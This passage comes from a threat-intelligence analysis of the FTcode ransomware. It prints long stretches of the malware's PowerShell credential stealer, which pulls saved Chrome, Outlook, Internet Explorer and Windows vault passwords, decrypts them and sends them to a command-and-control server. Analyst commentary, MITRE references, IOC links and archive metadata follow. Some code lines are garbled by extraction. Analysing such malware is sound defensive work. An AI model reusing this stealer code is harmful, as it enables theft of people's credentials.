$Offset; $y -lt $HeaderLength; $y++)\n  {\n    $Serial = ParseVarint $Payload[$y .. ($y + 8)] $VarintSize\n    $y += $VarintSize.Value - 1\n\n```\n\n-----\n\n```\n    Switch ($Serial) \n    {\n     {$_ -lt 0xA} { $Len = $SerialMap[$Serial]; break } #\nSegment Mapping\n     {$_ -gt 0xB} {  # Decode Field\n       If ($Serial % 2 -eq 0) { $Len = (($Serial - 0xC) / 2) }\n       Else { $Len = (($Serial - 0xD) / 2) }\n     }\n    }\n    $FieldSeq += $Len;\n  }\n  $Offset = $HeaderLength;\n  For ($f = 0; $f -lt $FieldSeq.Length; $f++)\n  {\n   $Str = $Encoding.GetString($Payload[$Offset .. ($Offset +\n$FieldSeq[$f] - 1)])\n   $isBlack = 0\n   #Switch option ? -> value : 0 -> url, 3 -> username, 5 -> pwd\nto decode \n   If ($f -eq 0) { $url = $Str }\n   ElseIf ($f -eq 3) { $user = $Str }\n   ElseIf ($f -eq 5) { $pwd =\nDecodePasswordChrome($Payload[$Offset .. ($Offset + $FieldSeq[$f] 1)]) }\n   $Offset += $FieldSeq[$f]\n  }\n  if(-Not($user -like '^\\u0001*') -and -Not($user -like '^\\u0000'))\n# Mapping different on Chrome, check it\n  {\n   If ($user.Length -gt 0 -or $pwd.Length -gt 0) #Add collected\ninfo as chrome cred\n   { \n    $url = ([System.Uri]$url).Host\n    if($global:chromeInfo[$url] -eq $null) {\n$global:chromeInfo[$url] = @()}\n    $global:chromeInfo[$url] += @{[string]$user = [string]$pwd}\n   }\n  }\n }\n catch { SendStringToC2 \"crederror=ERR:ParsePayloadSQLite:\n$($_.Exception.Message)\"; } \n}\n\n```\nThe next section of code defines the function for decode the passwords from Chrome\nbrowser. Like for Mozilla, this checks the presence of the profile but can't check more\nfor getting debug informations. We can note that the encoding code is for the Latin\nlanguages victims ( ISO-8859-1 -> Western Europe). The comparative method is\ndifferent too, instead of parse each address of the cells, on Chrome, this structure is\ndefined and can be parsed by the specific location on the stream. Once this done,\nthis parse the data with the dll like Mozilla for getting the data and push on the list of\ndumped chrome credentials.\n\n\n-----\n\n```\nFunction DecodePasswordChrome($Password)\n{\n try\n {\n  $P = $Encoding.GetBytes($Password)\n  try\n  {\n   $Decrypt =\n[System.Security.Cryptography.ProtectedData]::Unprotect($Password,$nu\n[System.Security.Cryptography.DataProtectionScope]::CurrentUser)\n   Return [System.Text.Encoding]::Default.GetString($Decrypt);\n  }\n  Catch { Return \"\" }\n }\n catch { SendStringToC2 \"crederror=ERR:DecodePasswordChrome:\n$($_.Exception.Message)\";} \n}\nfunction chrome_dump()\n{\n try\n {\n  $global:chromeInfo = @{};\n  $global:chromeError = \"SUCCESS\"\n  $dbFilePath =\n\"$($Env:USERPROFILE)\\AppData\\Local\\Google\\Chrome\\User Data\\*\\Login\nData\"\n  $dbFiles = $(Get-ChildItem $dbFilePath).FullName;    \n  if($dbFiles.Count -le 0 -and $dbFiles.Length -le 0) {\n$global:chromeError = \"NO PROFILES\"; } \n  foreach($dbFile in $dbFiles) \n  {\n    if($dbFile -ne $null) \n    {\n      if(([System.IO.File]::Exists($dbFile))) \n      {\n        $Stream = New-Object IO.FileStream -ArgumentList\n\"$dbFile\", 'Open', 'Read', 'ReadWrite'\n        Add-Type -AssemblyName System.Security\n        $Encoding =\n[System.Text.Encoding]::GetEncoding(28591) # -> iso-8859-1 -> Western\nEurope (ISO) -> Latin languages victims\n        $StreamReader = New-Object IO.StreamReader ArgumentList $Stream, $Encoding\n        $BinaryText = $StreamReader.ReadToEnd()\n        $StreamReader.Close()\n        $Stream.Close()\n        $SerialMap = @{0=0; 1=1; 2=2; 3=3; 4=4; 5=5; 6=6;\n7=8; 8=0; 9=0}\n        If ((Compare-Object $BinaryText[0x0 .. 0x5] @('S',\n'Q', 'L', 'i', 't', 'e')) -eq $null) #Text -> SQLite input\n        {\n          $NumPages = __ToInt($BinaryText[0x1C .. 0x1F])\n          $PageSize = __ToInt($BinaryText[0x10 .. 0x11])\n          for($x = 0x2; $x -lt $NumPages; $x++)\n\n```\n\n-----\n\n```\n          {\n            $PageStart = ($x * $PageSize);\n            ParseSQLite $BinaryText[$PageStart ..\n($PageStart + $PageSize - 1)] # Parse the cells\n          }\n        }\n              }\n    }\n  }\n  return @{\"logs\" = \"$global:log\"; \"error\" = $global:chromeError;\n\"info\" = $global:chromeInfo}  \n }\n catch { SendStringToC2 \"crederror=ERR:chrome_dump:\n$($_.Exception.Message)\";}\n}\n\n```\nThe next functionalities are for dumping the credential from the differents versions of\nOutlook, this check for the IMAP, SMTP and POP3 credentials and configuration.\n\n\n-----\n\n```\nfunction ol_dump()\n{\n try\n {\n  $wms = \"HKCU:\\Software\\Microsoft\\Windows\nNT\\CurrentVersion\\Windows Messaging\nSubsystem\\Profiles\\*\\9375CFF0413111d3B88A00104B2A6676\\*\";\n  $office =\n\"HKCU:\\Software\\Microsoft\\Office\\1[56].0\\Outlook\\Profiles\\*\\9375CFF04\n  $allPaths = @();\n  $olInfo = @{};\n  $olError = \"SUCCESS\";\n  $tmpWMS = (Get-ChildItem $wms -ErrorAction SilentlyContinue)\n  $tmpOffice = (Get-ChildItem $office -ErrorAction\nSilentlyContinue)\n  if($tmpWMS -ne $null){ $allPaths += $tmpWMS; }\n  if($tmpOffice -ne $null){ $allPaths += $tmpOffice; }\n  Add-Type -AssemblyName System.Security\n  foreach($path in $allPaths) \n  {\n   $imapServer = ($path | Get-ItemProperty -ErrorAction\nSilentlyContinue | select -ErrorAction SilentlyContinue ExpandProperty \"IMAP Server\");\n   if($imapServer -ne $null) \n   {\n     $server = $imapServer\n     try{ $server = \n[System.Text.Encoding]::DEFAULT.GetString($imapServer) -replace\n\"\\u0000\",\"\" -replace \"0x00\",\"\"; } catch {}\n     $userBytes = ($path | Get-ItemProperty -ErrorAction\nSilentlyContinue | select -ErrorAction SilentlyContinue ExpandProperty \"IMAP User\");\n     $user = \"\"; \n     if($userBytes -ne $null) \n     {\n      $user = $userBytes;\n      try{ $user =\n[System.Text.Encoding]::DEFAULT.GetString($userBytes) -replace\n\"\\u0000\",\"\" -replace \"\\x00\",\"\"; }catch{}\n     }\n     $encPwd = ($path | Get-ItemProperty -ErrorAction\nSilentlyContinue | select -ErrorAction SilentlyContinue ExpandProperty \"IMAP Password\");\n     $pwd = \"\";\n     try\n     {\n      $pwd =\n[System.Text.Encoding]::DEFAULT.GetString([System.Security.Cryptograp\n $null,\n[System.Security.Cryptography.DataProtectionScope]::CurrentUser)) replace \"\\u0000\",\"\" -replace \"0x00\",\"\"\n     }\n     catch{}\n     try \n\n```\n\n-----\n\n```\n     {\n      $port = [System.Text.Encoding]::DEFAULT.GetString(($path\n| Get-ItemProperty -ErrorAction SilentlyContinue | select ErrorAction SilentlyContinue -ExpandProperty \"IMAP Port\")) -replace\n\"0x00\",\"\"\n      $server += \":\" + $port\n     }\n     catch{}\n     if($olInfo[$server] -eq $null) { $olInfo[$server] = @(); }\n     $olInfo[$server] += @{ [string]$user = [string]$pwd }\n     $smtpServer = ($path | Get-ItemProperty -ErrorAction\nSilentlyContinue | select -ErrorAction SilentlyContinue ExpandProperty \"SMTP Server\");\n     if($smtpServer -ne $null) \n     {\n      $server = $smtpServer;\n      try{ $server = \n[System.Text.Encoding]::DEFAULT.GetString($smtpServer) -replace\n\"\\u0000\",\"\" -replace \"0x00\",\"\"; } catch{}\n      if($olInfo[$server] -eq $null) { $olInfo[$server] = @();\n}\n      $olInfo[$server] += @{ [string]$user = [string]$pwd }\n     }\n   }\n   $pop3Server = ($path | Get-ItemProperty -ErrorAction\nSilentlyContinue | select -ErrorAction SilentlyContinue ExpandProperty \"POP3 Server\");\n   if($pop3Server -ne $null) \n   {\n     $server = $pop3Server       \n     try { $server = \n[System.Text.Encoding]::DEFAULT.GetString($pop3Server) -replace\n\"\\u0000\",\"\" -replace \"0x00\",\"\"; } catch {}\n     $userBytes = ($path | Get-ItemProperty -ErrorAction\nSilentlyContinue | select -ErrorAction SilentlyContinue ExpandProperty \"POP3 User\")\n     $user = \"\";\n     if($userBytes -ne $null) \n     {\n      $user = $userBytes\n      try{ $user =\n[System.Text.Encoding]::DEFAULT.GetString($userBytes) -replace\n\"\\u0000\",\"\" -replace \"\\x00\",\"\";}catch {}\n     }\n     $encPwd = ($path | Get-ItemProperty -ErrorAction\nSilentlyContinue | select -ErrorAction SilentlyContinue ExpandProperty \"POP3 Password\")\n     $pwd = \"\";\n     try \n     {\n      $pwd =\n[System.Text.Encoding]::DEFAULT.GetString([System.Security.Cryptograp\n $null,\n[System.Security.Cryptography.DataProtectionScope]::CurrentUser)) replace \"\\u0000\",\"\" -replace \"0x00\",\"\"\n\n```\n\n-----\n\n```\n     }\n     catch {}\n     try \n     {\n      $port = [System.Text.Encoding]::DEFAULT.GetString(($path\n| Get-ItemProperty -ErrorAction SilentlyContinue | select ErrorAction SilentlyContinue -ExpandProperty \"POP3 Port\")) -replace\n\"0x00\",\"\"\n      $server += \":\" + $port\n     }\n     catch {}\n     if($olInfo[$server] -eq $null){ $olInfo[$server] = @(); }\n     $olInfo[$server] += @{ [string]$user = [string]$pwd }\n     $smtpServer = ($path | Get-ItemProperty -ErrorAction\nSilentlyContinue | select -ErrorAction SilentlyContinue ExpandProperty \"SMTP Server\");\n     if($smtpServer -ne $null) \n     {\n      $server = $smtpServer;\n      try { $server = \n[System.Text.Encoding]::DEFAULT.GetString($smtpServer) -replace\n\"\\u0000\",\"\" -replace \"0x00\",\"\";}catch {}\n      if($olInfo[$server] -eq $null){ $olInfo[$server] = @(); \n}\n      $olInfo[$server] += @{ [string]$user = [string]$pwd }\n     }\n   }\n  }\n  return @{\"logs\" = \"$global:log\"; \"error\" = $olError; \"info\" =\n$olInfo}  \n }\n catch { SendStringToC2 \"crederror=ERR:ol_dump:\n$($_.Exception.Message)\";}\n}\n\n```\nAt the last, this check by the history files of Internet Explorer, the URL are extracted\nfrom their algorithm with their hash, this extracts the value from this result for getting\nthe credentials. The OS version is also checked, since windows 8, IE use vault\nsystems for managing the security of theirs passwords. Like the rest, the thinking\nabout the attacker's logic is always as strange that more logic to test the existence of\nthe profiles after check the OS versions due to the way like the data is stored is\ndifferent and this useless to test the second part.\n\n\n-----\n\n```\nfunction ie_dump()\n{\n try\n {\n  Add-Type -AssemblyName System.Security\n  $ieInfo = @{};\n  $ieError = \"SUCCESS\"\n  $shell = New-Object -ComObject Shell.Application\n  $hist = $shell.NameSpace(34) # Alternative method of checking\nInternet Explorer history -> C:\\Users\\\n<Username>\\AppData\\Local\\Microsoft\\Windows\\History\n  $folder = $hist.Self;\n  if((@($hist.Items()).Count) -le 0) { $ieInfo = \"NO HISTORY\"; }\n  $hist.Items() | foreach \n  {\n   if ($_.IsFolder) \n   {\n    $siteFolder = $_.GetFolder\n    $siteFolder.Items() | foreach \n    {\n     $site = $_;\n     if ($site.IsFolder) \n     {\n      $pageFolder = $site.GetFolder;\n      $pageFolder.Items() | foreach \n      {\n       $url = $($pageFolder.GetDetailsOf($_,0)) ;\n       $enc = [system.Text.Encoding]::UTF8;\n       $entropy= $enc.GetBytes($url);\n       $url16 = [System.Text.Encoding]::GetEncoding(\"UTF16\").GetBytes($url + \"`0\");\n       $sha1 = [System.Security.Cryptography.SHA1]::Create();\n       $hash = $sha1.ComputeHash($url16);\n       $hs = \"\" \n       $cs = 0\n       $urlHASH = $($hash | %{ $hs += $_.ToString(\"x2\") ; $cs\n+= $_ } \n       ($hs + ($cs % 256).ToString(\"x2\")).ToUpper())\n       $fromREG = $null; \n       $fromREG = $(Get-ItemProperty -PATH\n\"HKCU:\\Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2\" Name $urlHASH -ErrorAction SilentlyContinue | Select-Object ExpandProperty $urlHASH)  \n       if($fromREG -ne $null) \n       {                  \n        try{ $Decrypt =\n[System.Security.Cryptography.ProtectedData]::Unprotect($fromREG,\n$url16,\n[System.Security.Cryptography.DataProtectionScope]::LocalMachine); }\n        catch { Continue }\n        $dwSize = [bitconverter]::ToInt32($Decrypt[0..3], 0)\n        $dwSecretInfoSize =\n[bitconverter]::ToInt32($Decrypt[4..7], 0)\n        $dwSecretSize =\n[bitconverter]::ToInt32($Decrypt[8..11], 0)\n\n```\n\n-----\n\n```\n        $dwTotalSecrets \n[bitconverter]::ToInt32($Decrypt[20..23], 0) / 2\n        if($fromREG.Length -ge ($dwSize + $dwSecretInfoSize\n+$dwSercertSize))\n        {\n         $url = ([System.Uri]$url).Host  \n         if($ieInfo[$url] -eq $null) { $ieInfo[$url] = @();\n}\n         $allCreds =\n([System.Text.Encoding]::Default.GetString($Decrypt[($Decrypt.Length\n- $dwSecretSize)..($Decrypt.Length)]) -split \"\\x00\\x00\") -replace\n\"\\x00\", \"\";\n         for($i = 0; $i -lt $dwTotalSecrets; $i++ ) \n         {\n          $user = $allCreds[$i]\n          $pwd = $allCreds[$i + 1]\n          $ieInfo[$url] += @{ [string]$user = [string]$pwd\n};\n         }                      \n        }\n       }\n      }\n     }\n    }\n   }\n  }\n  if(([int32]([string][System.Environment]::OSVersion.Version.Major\n+ [string][System.Environment]::OSVersion.Version.Minor)) -ge 62) # > greater than or equal Windows 8 OS -> Password Vault improved\n  {\n   [void]\n[Windows.Security.Credentials.PasswordVault,Windows.Security.Credenti\n   $vault = New-Object Windows.Security.Credentials.PasswordVault;\n   $allCreds = $vault.RetrieveAll() | % { $_.RetrievePassword();$_\n}\n   foreach($cred in $allCreds) \n   {\n    $url = ([System.Uri]$cred.Resource).Host\n    if($ieInfo[$url] -eq $null) { $ieInfo[$url] = @(); }\n    $ieInfo[$url] += @{ [string]$cred.UserName =\n[string]$cred.Password }\n   }\n  }\n  return @{\"logs\" = \"$global:log\"; \"error\" = $ieError; \"info\" =\n$ieInfo}  \n }\n catch { SendStringToC2 \"crederror=ERR:ie_dump:\n$($_.Exception.Message)\";}\n}\n\n```\nThe payload executes the functions and merges all the data. Why do a better code\nand easily maintainable by merging in one function with a switch condition for redirect\nthe common part to the same code and avoid to do the same execution but this\n\n\n-----\n\nconsistent with the fact this reinfect each 15 minutes with the logic of thought (not\nvery stealthy but it works).\n```\n# Execute password dump\n$ffInfo = ff_dump\n$ieInfo = ie_dump\n$olInfo = ol_dump\n$chromeInfo = chrome_dump\n$allInfo = @{\"logs\" = \"$global:log\"; \"error\" = \"SUCCESS\"; \"info\" =\n@{}}  \n# Merge all the data\nmergeInfo $olInfo $allInfo\nmergeInfo $chromeInfo $allInfo\nmergeInfo $ieInfo $allInfo\nmergeInfo $ffInfo $allInfo\n\n```\nThis time doesn't check the import of the class (works in .NET Framework 4.7.2 and\nlater versions), this use it for perform the asynchronous communication layer to\nserialize and deserialize the credentials dumped. But why not used the native json\nformat with asynchronous call by job for be more compatible with more OS versions\nand that the attacker has already used (so now how works except this a edited\ncopy/paste of course) ?\n```\n# Try/catch ? \nAdd-Type -AssemblyName System.Web.Extensions;\n$ps_js = new-object\nsystem.web.script.serialization.javascriptSerializer;\ntry\n{\n  $sendInfo = @{};\n  $allInfo[\"info\"].GetEnumerator() | %{\n   $host1 = ([string]$_.key).toLower();\n   if( $host1 -ne \"empty\" )\n   {\n    $sendInfo[ $host1 ] = @();\n    foreach($value in $_.value ) \n    {\n     $sendInfo[ $host1 ] += @{\n[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes( [string]\n($value.Keys) ) ) =\n[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes( [string]\n($value.Values) ) ) };\n    } \n   }\n  }\n  try{ SendStringToC2 (\"cred=\" + [uri]::EscapeDataString(\n$ps_js.Serialize($sendInfo) ) ); }catch{}\n  try{ SendStringToC2 (\"crederror=\" + $allInfo[\"error\"]); }catch{}\n}\ncatch{}\n} #End of \"stiller\" block\n\n```\nThe main function is only for performing the recognization of the good format to use\nfor the .NET class for exploit the dll. Most of this code is copied from the previous\ndescribed functions.\n\n\n-----\n\n```\nfunction main()\n{\n  # Copy/Paste skill\n try\n {\n  $mPaths = @(\"$env:SystemDrive\\Program Files\\Mozilla Firefox\",\n\"$env:SystemDrive\\Program Files\\Mozilla Thunderbird\",\n\"$env:SystemDrive\\Program Files (x86)\\Mozilla Firefox\",\n\"$env:SystemDrive\\Program Files (x86)\\Mozilla Thunderbird\")  \n  $mozillaPath = $null\n  foreach($path in $mPaths) \n  {\n   $nssPath = $(Join-Path ([string]$path) ([string]'nss3.dll'))\n   if([System.IO.File]::Exists($nssPath)) \n   {\n    $mozillaPath = $path;\n    break;\n   }\n  }\n  if($mozillaPath -eq $null) {$result = $stillerBlock.Invoke();}\n  else\n  { \n   $dll = $(Join-Path ([string]$mozillaPath) ([string]'nss3.dll'))\n   $is86dll = (Get-ExecutableType -Path $dll) -eq 32\n   $is86 = [IntPtr]::Size -eq 4\n   $result = $null;\n   if($is86dll -and $is86) {$result = $stillerBlock.Invoke();}\n   elseif(-Not($is86dll) -and -Not($is86)) {$result =\n$stillerBlock.Invoke();}\n   elseif($is86dll -and -Not($is86)) \n   {\n    Start-Job -RunAs32 -ScriptBlock $stillerBlock | Out-Null\n    $result = (Get-Job | Wait-Job | Receive-Job)\n   }\n   elseif(-Not($is86dll) -and $is86) {$result =\n$stillerBlock.Invoke();}     \n  }\n  return $result;\n }\n catch{ SendStringToC2 \"crederror=ERR:chooseArch:\n$($_.Exception.Message)\";}\n}\nSendStringToC2 \"crederror=start chooseArch\";\nmain\n\n```\nUnfortunately, this group can let several hours or days before drops the ransomware\npayload and by the fact of detection and blockage of domains, it's impossible to study\nthe last part the ransomware ftcode but we can invalidate that it must reuse the IV\ndefined in the \"db\" file (random GUID defines) to encrypt the data with AES so the\nsecret must be in the ransomware code. That makes possible recovers the data if\nransomware script and db file can be available or if this possible to have the GUID by\ninterception of the frame (send GUID on C2) and can be edited for getting IV too.\n\nCompared to the analysis in early January 2020, the Threat Actor added the\npassword dump for IE and Outlook at their script. The group have a low level on the\n\n\n-----\n\nprofessional approach of a cybercriminal group and coding skills but the fact that a\npart of the encryption process are in memory and are flush make it more deadly in\nthis approach.\n\n## Cyber kill chain\n\nThis process graph represent the cyber kill chain used by the attacker.\n\n## Indicators Of Compromise (IOC)\n\n[The IOC can be exported in JSON and](https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/Additional%20Analysis/Unknown/2020-06-22/JSON/IOC-FTcode-2020-06-22.json) [CSV](https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/Additional%20Analysis/Unknown/2020-06-22/CSV/IOC-FTcode-2020-06-22.csv)\n\n## References MITRE ATT&CK Matrix\n\n\n### Enterprise tactics\n\n\n### Technics used Ref URL\n\n\n### Execution Scheduled Task\n Scripting\n PowerShell\n Execution through API\n Execution through Module Load\n\n Persistence Scheduled Task\n\n\n### Privilege Escalation\n\n Defense Evasion\n\n Credential Access\n\n\n### Scheduled Task\n\n Scripting\n Compile After Delivery\n\n Credentials in Files\n\n\n### https://attack.mitre.org/techniques/T1053\n https://attack.mitre.org/techniques/T1064\n https://attack.mitre.org/techniques/T1086\n https://attack.mitre.org/techniques/T1106\n https://attack.mitre.org/techniques/T1129\n\n https://attack.mitre.org/techniques/T1053\n\n https://attack.mitre.org/techniques/T1053\n\n https://attack.mitre.org/techniques/T1064\n https://attack.mitre.org/techniques/T1500\n\n https://attack.mitre.org/techniques/T1081\n\n\nThis can be exported as JSON format [Export in JSON](https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/Additional%20Analysis/Unknown/2020-06-22/JSON/MITRE-Ftcode-2020-06-22.json)\n\n\n-----\n\n## Links\n\nOriginal tweet:\n\n### https://twitter.com/JAMESWT_MHT/status/1273902965041045507 https://twitter.com/reecdeep/status/1273522967935356933\n\nLinks Anyrun:\n\nReferences:\n\n### FTCODE Ransomware Now Steals Chrome, Firefox Credentials\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-06-22 - FTcode targets European countries.pdf"
    ],
    "report_names": [
        "2020-06-22 - FTcode targets European countries.pdf"
    ],
    "threat_actors": [
        {
            "id": "42a6a29d-6b98-4fd6-a742-a45a0306c7b0",
            "created_at": "2022-10-25T15:50:23.710403Z",
            "updated_at": "2025-03-27T02:00:55.531313Z",
            "deleted_at": null,
            "main_name": "Silence",
            "aliases": [
                "Whisper Spider"
            ],
            "source_name": "MITRE:Silence",
            "tools": [
                "Winexe",
                "SDelete"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "88e53203-891a-46f8-9ced-81d874a271c4",
            "created_at": "2022-10-25T16:07:24.191982Z",
            "updated_at": "2025-03-27T02:02:10.13692Z",
            "deleted_at": null,
            "main_name": "Silence",
            "aliases": [
                "ATK 86",
                "Contract Crew",
                "TAG-CR8",
                "TEMP.TruthTeller",
                "Whisper Spider"
            ],
            "source_name": "ETDA:Silence",
            "tools": [
                "EDA",
                "EmpireDNSAgent",
                "Farse",
                "Ivoke",
                "Kikothac",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Meterpreter",
                "ProxyBot",
                "ReconModule",
                "Silence.Downloader",
                "TiniMet",
                "TinyMet",
                "TrueBot",
                "xfs-disp.exe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "99cb4e5b-8071-4f9e-aa1d-45bfbb6197e3",
            "created_at": "2023-01-06T13:46:38.860754Z",
            "updated_at": "2025-03-27T02:00:02.937438Z",
            "deleted_at": null,
            "main_name": "TA505",
            "aliases": [
                "SectorJ04 Group",
                "Dudear",
                "G0092",
                "ATK103",
                "Hive0065",
                "Spandex Tempest",
                "GRACEFUL SPIDER",
                "GOLD TAHOE",
                "CHIMBORAZO",
                "SectorJ04"
            ],
            "source_name": "MISPGALAXY:TA505",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "08c8f238-1df5-4e75-b4d8-276ebead502d",
            "created_at": "2023-01-06T13:46:39.344081Z",
            "updated_at": "2025-03-27T02:00:03.056208Z",
            "deleted_at": null,
            "main_name": "Copy-Paste",
            "aliases": [],
            "source_name": "MISPGALAXY:Copy-Paste",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "5e6b31a6-80e3-4e7d-8b0a-d94897ce9b59",
            "created_at": "2024-06-19T02:03:08.128175Z",
            "updated_at": "2025-03-27T02:05:17.400394Z",
            "deleted_at": null,
            "main_name": "GOLD TAHOE",
            "aliases": [
                "SectorJ04 ",
                "Spandex Tempest ",
                "TA505 ",
                "FIN11 "
            ],
            "source_name": "Secureworks:GOLD TAHOE",
            "tools": [
                " Cobalt Strike",
                " FlawedAmmy",
                " Get2",
                " GraceWire",
                " Malichus",
                " SDBbot",
                " ServHelper",
                " TrueBot",
                "Clop"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "75d4d6a9-b5d1-4087-a7a0-e4a9587c45f4",
            "created_at": "2022-10-25T15:50:23.5188Z",
            "updated_at": "2025-03-27T02:00:55.489882Z",
            "deleted_at": null,
            "main_name": "TA505",
            "aliases": [
                "TA505",
                "Hive0065",
                "Spandex Tempest",
                "CHIMBORAZO"
            ],
            "source_name": "MITRE:TA505",
            "tools": [
                "AdFind",
                "Azorult",
                "FlawedAmmyy",
                "Mimikatz",
                "Dridex",
                "TrickBot",
                "Get2",
                "FlawedGrace",
                "Cobalt Strike",
                "ServHelper",
                "Amadey",
                "SDBbot",
                "PowerSploit"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "e447d393-c259-46e2-9932-19be2ba67149",
            "created_at": "2022-10-25T16:07:24.28282Z",
            "updated_at": "2025-03-27T02:02:10.159466Z",
            "deleted_at": null,
            "main_name": "TA505",
            "aliases": [
                "ATK 103",
                "Chimborazo",
                "Gold Evergreen",
                "Gold Tahoe",
                "Graceful Spider",
                "Hive0065",
                "Operation Tovar",
                "Operation Trident Breach",
                "SectorJ04",
                "Spandex Tempest",
                "TA505",
                "TEMP.Warlock"
            ],
            "source_name": "ETDA:TA505",
            "tools": [
                "Amadey",
                "AmmyyRAT",
                "AndroMut",
                "Azer",
                "Bart",
                "Bugat v5",
                "CryptFile2",
                "CryptoLocker",
                "CryptoMix",
                "CryptoShield",
                "Dridex",
                "Dudear",
                "EmailStealer",
                "FRIENDSPEAK",
                "Fake Globe",
                "Fareit",
                "FlawedAmmyy",
                "FlawedGrace",
                "FlowerPippi",
                "GOZ",
                "GameOver Zeus",
                "GazGolder",
                "Gelup",
                "Get2",
                "GetandGo",
                "GlobeImposter",
                "Gorhax",
                "GraceWire",
                "Gussdoor",
                "Jaff",
                "Kasidet",
                "Kegotip",
                "Kneber",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Locky",
                "MINEBRIDGE",
                "MINEBRIDGE RAT",
                "MirrorBlast",
                "Neutrino Bot",
                "Neutrino Exploit Kit",
                "P2P Zeus",
                "Peer-to-Peer Zeus",
                "Philadelphia",
                "Philadephia Ransom",
                "Pony Loader",
                "Rakhni",
                "ReflectiveGnome",
                "Remote Manipulator System",
                "RockLoader",
                "RuRAT",
                "SDBbot",
                "ServHelper",
                "Shifu",
                "Siplog",
                "TeslaGun",
                "TiniMet",
                "TinyMet",
                "Trojan.Zbot",
                "Wsnpoem",
                "Zbot",
                "Zeta",
                "ZeuS",
                "Zeus"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536223,
    "ts_updated_at": 1743041738,
    "ts_creation_date": 1653681524,
    "ts_modification_date": 1653681524,
    "files": {
        "pdf": "https://archive.orkl.eu/a35030565a2c24f90110923f116c0def4ead9f03.pdf",
        "text": "https://archive.orkl.eu/a35030565a2c24f90110923f116c0def4ead9f03.txt",
        "img": "https://archive.orkl.eu/a35030565a2c24f90110923f116c0def4ead9f03.jpg"
    }
}